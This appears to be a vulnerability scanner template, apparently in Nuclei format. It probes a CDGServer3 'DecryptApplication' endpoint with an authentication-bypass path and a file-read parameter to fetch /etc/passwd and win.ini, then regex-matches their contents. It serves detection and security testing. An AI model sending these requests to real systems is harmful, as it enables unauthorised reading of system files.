http:
  - method: GET
    path:
      - "{{BaseURL}}/CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=/etc/passwd&uploadFileId=1&fileName1=test1111"
      - "{{BaseURL}}/CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=c:/windows/win.ini&uploadFileId=1&fileName1=test1111"
    
    stop-at-first-match: true
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or